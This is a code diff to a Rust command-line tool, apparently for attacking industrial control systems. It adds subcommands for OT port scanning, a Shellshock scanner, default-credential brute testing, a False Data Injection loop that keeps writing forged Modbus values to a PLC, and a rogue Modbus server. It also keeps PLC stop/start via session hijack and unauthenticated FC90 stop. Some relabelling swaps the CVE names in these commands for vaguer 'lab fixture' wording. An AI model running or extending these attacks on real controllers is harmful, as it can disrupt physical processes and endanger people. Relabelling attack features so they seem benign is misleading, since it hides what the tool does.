@@ -74,6 +74,15 @@ pub enum Verb {
     },
     /// Launch the interactive terminal UI
     Tui,
+    /// Start the web interface (browser-based UI)
+    Web {
+        /// Host to listen on
+        #[arg(long, default_value = "127.0.0.1")]
+        host: String,
+        /// Port to listen on
+        #[arg(long, default_value = "8888")]
+        port: u16,
+    },
     /// Manage the device database
     Db {
         #[command(subcommand)]
@@ -176,7 +185,7 @@ pub enum GetNoun {
         #[arg(long, default_value = "20")]
         max_users: u32,
     },
-    /// Schneider M340 session cookie (CVE-2017-6026)
+    /// Schneider legacy web-session compatibility check (advisory mapping unverified)
     Session,
 }
 
@@ -289,9 +298,9 @@ pub enum RunCmd {
     },
     /// Flash identification LED on Schneider PLC
     FlashLed,
-    /// CVE-2017-6026: Stop Schneider M340 via session hijack
+    /// Stop a Schneider lab fixture via a recovered legacy web session
     SessionStop,
-    /// CVE-2017-6026: Start Schneider M340 via session hijack
+    /// Start a Schneider lab fixture via a recovered legacy web session
     SessionRun,
     /// FC90: Unauthenticated stop (--model tm221 for TM221, default m340)
     Fc90Stop {
@@ -316,6 +325,57 @@ pub enum RunCmd {
     EwonCreds {
         #[arg(long, default_value = "20")]
         max_users: u32,
+    },
+    /// OT network port scanner: TCP connect scan for common ICS/SCADA ports
+    Portscan {
+        /// Additional ports to scan (comma-separated, e.g. "8888,9999")
+        #[arg(long)]
+        ports: Option<String>,
+    },
+    /// CVE-2014-6271 Shellshock scanner: test CGI endpoints on PLC/HMI web servers
+    Shellshock {
+        /// HTTP port of the target web server
+        #[arg(long, default_value = "80")]
+        http_port: u16,
+    },
+    /// HTTP Basic Auth default-credential tester for ICS web interfaces
+    DefaultCreds {
+        /// URL path to authenticate against (default: /)
+        #[arg(long, default_value = "/")]
+        path: String,
+        /// HTTP port of the target web server
+        #[arg(long, default_value = "80")]
+        http_port: u16,
+    },
+    /// False Data Injection: continuously write a forged Modbus value (SCASS §6.3.1)
+    Fdi {
+        /// Modbus address to write (0-based)
+        #[arg(long)]
+        address: u16,
+        /// Value to inject (u16; for coils: 0=OFF, 1=ON)
+        #[arg(long)]
+        value: u16,
+        /// Target type: register | coil
+        #[arg(long, default_value = "register")]
+        target: String,
+        /// Seconds between writes
+        #[arg(long, default_value = "2")]
+        interval: u64,
+        /// Stop after N writes (0 = run until Ctrl-C)
+        #[arg(long, default_value = "0")]
+        count: u64,
+    },
+    /// Rogue Modbus TCP server: impersonate a slave with configurable fixed responses
+    ModbusServer {
+        /// TCP port to listen on
+        #[arg(long, default_value = "502")]
+        port: u16,
+        /// Value returned for all FC3 holding-register reads
+        #[arg(long, default_value = "0")]
+        reg_value: u16,
+        /// Value returned for all FC1 coil reads (0=OFF, 1=ON)
+        #[arg(long, default_value = "0")]
+        coil_value: u8,
     },
 }
 
@@ -352,7 +412,7 @@ pub fn run(args: Args) -> Result<()> {
     }
     let Some(command) = args.command else { return Ok(()); };
     match command {
-        Verb::Tui => Ok(()),
+        Verb::Tui | Verb::Web { .. } => Ok(()), // handled in main.rs before cli::run is called
         Verb::Db { cmd } => run_db(cmd),
         Verb::Scan => run_scan(args.ip.as_deref(), args.port, args.timeout, args.protocol),
         Verb::Get { noun } => {
@@ -363,9 +423,15 @@ pub fn run(args: Args) -> Result<()> {
             let ip = require_ip(args.ip.as_ref(), "set")?;
             run_set(ip, args.port, args.timeout, args.protocol, noun)
         }
-        Verb::Run { exploit } => {
-            let ip = require_ip(args.ip.as_ref(), "run")?;
-            run_run(ip, args.port, args.timeout, exploit)
+        Verb::Run { exploit } => match exploit {
+            // ModbusServer binds locally: no target IP needed.
+            RunCmd::ModbusServer { port, reg_value, coil_value } => {
+                crate::core::modbus_server::serve(port, reg_value, coil_value == 1)
+            }
+            other => {
+                let ip = require_ip(args.ip.as_ref(), "run")?;
+                run_run(ip, args.port, args.timeout, other)
+            }
         }
     }
 }
@@ -444,7 +510,7 @@ fn scan_broadcast(proto: Protocol, timeout: u64) -> Result<()> {
             let devs = crate::vendors::beckhoff::scan::discover(&iface, timeout, false)?;
             crate::display::print_success(&format!("Found {} Beckhoff device(s).", devs.len()));
         }
-        p => bail!("{p:?} does not support broadcast scan — provide '-i <IP>'"),
+        p => bail!("{p:?} does not support broadcast scan: provide '-i <IP>'"),
     }
     Ok(())
 }
@@ -648,25 +714,21 @@ fn run_get(
             let pb = crate::display::spinner_start(&format!(
                 "Reading DB{db}:{offset}+{len} from {ip}…"
             ));
-            let data = s7comm::read_all_data(ip, s7_port, 5, password.as_deref());
+            let result = s7comm::read_data_block(ip, db, offset, len, s7_port, 5, password.as_deref());
             pb.finish_and_clear();
-            // Show the raw data read — DB read is not directly exposed; show all areas
-            let mut any = false;
-            for area in &["inputs", "outputs", "merkers"] {
-                if let Some(Some(bits)) = data.get(*area) {
-                    any = true;
-                    println!("  {area}:");
-                    let mut keys: Vec<&String> = bits.keys().collect();
-                    keys.sort();
-                    for bit in keys {
-                        println!("    {bit}: {}", bits[bit]);
+            match result {
+                Ok(bytes) => {
+                    for (i, chunk) in bytes.chunks(16).enumerate() {
+                        let hex: String = chunk
+                            .iter()
+                            .map(|b| format!("{b:02x}"))
+                            .collect::<Vec<_>>()
+                            .join(" ");
+                        println!("  {:04x}  {hex}", offset as usize + i * 16);
                     }
+                    crate::display::print_success(&format!("{} byte(s) from DB{db}.", bytes.len()));
                 }
-            }
-            if !any {
-                crate::display::print_warn(&format!(
-                    "No data received — use 'set db {db} {offset} <hex>' to write or check connection."
-                ));
+                Err(e) => crate::display::print_error(&format!("{e}")),
             }
             Ok(())
         }
@@ -815,8 +877,8 @@ fn run_get(
                         Ok(objs) => {
                             for obj in &objs {
                                 println!(
-                                    "  IOA {:>6}: type=0x{:02x} data={:?}",
-                                    obj.ioa, obj.type_id, obj.value
+                                    "  IOA {:>6}: type=0x{:02x} value={}",
+                                    obj.ioa, obj.type_id, obj.decoded
                                 );
                             }
                             crate::display::print_success(&format!(
@@ -1232,7 +1294,7 @@ fn run_set(
             match s7comm::write_data_block(ip, db, offset, &bytes, s7_port, 5, password.as_deref())
             {
                 Ok(true) => crate::display::print_success("DB write acknowledged."),
-                Ok(false) => crate::display::print_warn("Write sent — PLC did not acknowledge."),
+                Ok(false) => crate::display::print_warn("Write sent: PLC did not acknowledge."),
                 Err(e) => crate::display::print_error(&format!("{e}")),
             }
             Ok(())
@@ -1312,7 +1374,7 @@ fn run_set(
                     if on { "ON" } else { "OFF" }
                 )),
                 Ok(false) => {
-                    crate::display::print_warn("Command sent — negative confirmation.");
+                    crate::display::print_warn("Command sent: negative confirmation.");
                 }
                 Err(e) => crate::display::print_error(&format!("{e}")),
             }
@@ -1332,7 +1394,7 @@ fn run_set(
             let mut sess = client::connect(ip, iec_port)?;
             match client::double_command(&mut sess, ioa, state) {
                 Ok(true) => crate::display::print_success("Double Command confirmed."),
-                Ok(false) => crate::display::print_warn("Command sent — negative confirmation."),
+                Ok(false) => crate::display::print_warn("Command sent: negative confirmation."),
                 Err(e) => crate::display::print_error(&format!("{e}")),
             }
             Ok(())
@@ -1360,12 +1422,24 @@ fn set_state(
                 }
             } else {
                 let cur = s7comm::get_cpu_state(ip, s7_port, 5, None);
-                crate::display::print_info(&format!("Current: {cur}"));
-                if s7comm::change_cpu_state(ip, s7_port, 5) {
-                    let new = s7comm::get_cpu_state(ip, s7_port, 5, None);
-                    crate::display::print_success(&format!("New state: {new}"));
+                let want_run = state.eq_ignore_ascii_case("run");
+                let want_stop = state.eq_ignore_ascii_case("stop");
+                if want_run && cur.eq_ignore_ascii_case("running") {
+                    crate::display::print_info("Already running.");
+                } else if want_stop && cur.eq_ignore_ascii_case("stopped") {
+                    crate::display::print_info("Already stopped.");
+                } else if want_run || want_stop {
+                    crate::display::print_info(&format!("Current: {cur}"));
+                    if s7comm::change_cpu_state(ip, s7_port, 5) {
+                        let new = s7comm::get_cpu_state(ip, s7_port, 5, None);
+                        crate::display::print_success(&format!("New state: {new}"));
+                    } else {
+                        crate::display::print_error("Failed to change CPU state.");
+                    }
                 } else {
-                    crate::display::print_error("Failed to change CPU state.");
+                    crate::display::print_error(&format!(
+                        "Unknown state '{state}': use run, stop, or flip."
+                    ));
                 }
             }
         }
@@ -1375,7 +1449,7 @@ fn set_state(
             let run = !state.eq_ignore_ascii_case("stop");
             match fins::set_cpu_mode(ip, fins_port, 0, run) {
                 Ok(true) => crate::display::print_success(&format!("CPU set to {state}.")),
-                Ok(false) => crate::display::print_warn("FINS error — mode change rejected."),
+                Ok(false) => crate::display::print_warn("FINS error: mode change rejected."),
                 Err(e) => crate::display::print_error(&format!("{e}")),
             }
         }
@@ -1436,7 +1510,9 @@ fn set_tag(
     assignment: &str,
     proto: Option<Protocol>,
 ) -> Result<()> {
-    let (name, hex_val) = assignment.split_once('=').unwrap_or((assignment, "00"));
+    let Some((name, hex_val)) = assignment.split_once('=') else {
+        bail!("Tag assignment must be NAME=HEXBYTES, e.g. MAIN.valve=01");
+    };
     match proto {
         Some(Protocol::Rockwell) => {
             use crate::vendors::rockwell::driver;
@@ -1468,7 +1544,7 @@ fn set_tag(
             };
             match scan::write_symbol_value(&dev, &local_netid, name, value_bytes, port) {
                 Ok(true) => crate::display::print_success(&format!("Symbol '{name}' written.")),
-                Ok(false) => crate::display::print_warn("Write sent — ADS error code returned."),
+                Ok(false) => crate::display::print_warn("Write sent: ADS error code returned."),
                 Err(e) => crate::display::print_error(&format!("{e}")),
             }
         }
@@ -1514,7 +1590,9 @@ fn run_run(ip: &str, port: u16, timeout: u64, cmd: RunCmd) -> Result<()> {
         RunCmd::WriteSymbol { input } => {
             use crate::vendors::beckhoff::{ads, scan};
             let local_netid = ads::build_local_netid(&local_ip_for(ip));
-            let (sym_name, hex_val) = input.split_once('=').unwrap_or((&input, "00"));
+            let Some((sym_name, hex_val)) = input.split_once('=') else {
+                bail!("Symbol assignment must be NAME=HEXBYTES, e.g. MAIN.valve=01");
+            };
             let value_bytes = parse_hex(hex_val);
             if value_bytes.is_empty() {
                 bail!("Invalid hex value (format: SymbolName=hexbytes)");
@@ -1530,7 +1608,7 @@ fn run_run(ip: &str, port: u16, timeout: u64, cmd: RunCmd) -> Result<()> {
                 Ok(true) => {
                     crate::display::print_success(&format!("Symbol '{sym_name}' written."));
                 }
-                Ok(false) => crate::display::print_warn("Write sent — ADS error code returned."),
+                Ok(false) => crate::display::print_warn("Write sent: ADS error code returned."),
                 Err(e) => crate::display::print_error(&format!("{e}")),
             }
         }
@@ -1578,7 +1656,7 @@ fn run_run(ip: &str, port: u16, timeout: u64, cmd: RunCmd) -> Result<()> {
             };
             match result {
                 Ok(true) => crate::display::print_success("PLC stopped."),
-                Ok(false) => crate::display::print_warn("Command sent — no confirmation."),
+                Ok(false) => crate::display::print_warn("Command sent: no confirmation."),
                 Err(e) => crate::display::print_error(&format!("{e}")),
             }
         }
@@ -1592,7 +1670,7 @@ fn run_run(ip: &str, port: u16, timeout: u64, cmd: RunCmd) -> Result<()> {
             };
             match result {
                 Ok(true) => crate::display::print_success("PLC started."),
-                Ok(false) => crate::display::print_warn("Command sent — no confirmation."),
+                Ok(false) => crate::display::print_warn("Command sent: no confirmation."),
                 Err(e) => crate::display::print_error(&format!("{e}")),
             }
         }
@@ -1610,7 +1688,7 @@ fn run_run(ip: &str, port: u16, timeout: u64, cmd: RunCmd) -> Result<()> {
             ));
             match modicon_fc90::force_output_bit(ip, port, output_byte, force_state) {
                 Ok(true) => crate::display::print_success("Force command sent."),
-                Ok(false) => crate::display::print_warn("Command sent — no confirmation."),
+                Ok(false) => crate::display::print_warn("Command sent: no confirmation."),
                 Err(e) => crate::display::print_error(&format!("{e}")),
             }
         }
@@ -1653,6 +1731,99 @@ fn run_run(ip: &str, port: u16, timeout: u64, cmd: RunCmd) -> Result<()> {
                 ));
             }
         }
+        RunCmd::Portscan { ports } => {
+            use crate::core::portscan::scan_ot_ports;
+            use colored::Colorize;
+            let extra: Vec<u16> = ports
+                .as_deref()
+                .unwrap_or("")
+                .split(',')
+                .filter_map(|s| s.trim().parse::<u16>().ok())
+                .collect();
+            crate::display::print_info(&format!("Scanning OT ports on {ip}…"));
+            let results = scan_ot_ports(ip, timeout, &extra);
+            println!("\n  {:<6} {:<16} Banner", "Port", "Service");
+            println!("  {}", "─".repeat(60));
+            for r in &results {
+                if r.open {
+                    let banner = r.banner.as_deref().unwrap_or("");
+                    println!(
+                        "  {:<6} {:<16} {}",
+                        r.port.to_string().green(),
+                        r.service.green(),
+                        banner
+                    );
+                }
+            }
+            let open = results.iter().filter(|r| r.open).count();
+            println!();
+            if open == 0 {
+                crate::display::print_warn("No open ports found.");
+            } else {
+                crate::display::print_success(&format!("{open} open port(s) found."));
+            }
+        }
+        RunCmd::Shellshock { http_port } => {
+            use crate::core::shellshock::test_shellshock;
+            use colored::Colorize;
+            crate::display::print_info(&format!(
+                "Testing Shellshock (CVE-2014-6271) on {ip}:{http_port}…"
+            ));
+            let results = test_shellshock(ip, http_port, timeout);
+            println!("\n  {:<36} {:<12} Evidence", "Path", "Status");
+            println!("  {}", "─".repeat(72));
+            let mut any_vuln = false;
+            for r in &results {
+                let status = if r.vulnerable {
+                    any_vuln = true;
+                    "VULNERABLE".red().bold()
+                } else {
+                    "safe".dimmed()
+                };
+                println!("  {:<36} {:<12} {}", r.path, status, r.evidence);
+            }
+            println!();
+            if any_vuln {
+                crate::display::print_warn("Target may be vulnerable to Shellshock.");
+            } else {
+                crate::display::print_success("No Shellshock vulnerability detected.");
+            }
+        }
+        RunCmd::DefaultCreds { path, http_port } => {
+            use crate::core::httpcreds::test_http_basic;
+            crate::display::print_info(&format!(
+                "Testing HTTP default credentials on {ip}:{http_port}{path}…"
+            ));
+            match test_http_basic(ip, http_port, &path, timeout) {
+                Some(r) => {
+                    crate::display::print_success(&format!(
+                        "Valid credentials: {}:{} (HTTP {})",
+                        r.username, r.password, r.status
+                    ));
+                }
+                None => crate::display::print_warn("No default credentials accepted."),
+            }
+        }
+        RunCmd::Fdi { address, value, target, interval, count } => {
+            use crate::core::modbus_fdi::{fdi_loop, FdiTarget};
+            let fdi_target = match target.to_lowercase().as_str() {
+                "coil" => FdiTarget::Coil,
+                _ => FdiTarget::Register,
+            };
+            let desc = match fdi_target {
+                FdiTarget::Coil => format!("Coil[{address}] = {}", if value != 0 { "ON" } else { "OFF" }),
+                FdiTarget::Register => format!("HR[{address}] = {value}"),
+            };
+            crate::display::print_info(&format!(
+                "FDI: injecting {desc} on {ip} every {interval}s{}…",
+                if count > 0 { format!(" ({count} writes)") } else { " (Ctrl-C to stop)".into() }
+            ));
+            if let Err(e) = fdi_loop(ip, port, address, value, fdi_target, interval, count) {
+                crate::display::print_error(&format!("{e}"));
+            }
+        }
+        // ModbusServer is handled before run_run() in the Verb::Run dispatch.
+        RunCmd::ModbusServer { .. } => unreachable!(),
     }
     Ok(())
 }
